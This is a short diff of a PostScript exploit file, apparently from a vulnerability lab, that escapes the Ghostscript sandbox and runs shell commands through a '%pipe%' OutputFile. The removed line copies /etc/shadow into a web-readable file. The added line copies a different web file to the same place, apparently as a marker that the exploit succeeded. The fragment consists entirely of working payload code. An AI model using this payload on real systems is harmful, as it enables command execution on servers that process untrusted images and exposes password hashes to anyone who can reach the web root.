@@ -5,4 +5,4 @@ legal
 { null restore } stopped { pop } if
 { legal } stopped { pop } if
 restore
-mark /OutputFile (%pipe%cat /etc/shadow > /var/www/html/vsplate.txt) currentdevice putdeviceprops
+mark /OutputFile (%pipe%cat /var/www/html/3.txt > /var/www/html/vsplate.txt) currentdevice putdeviceprops
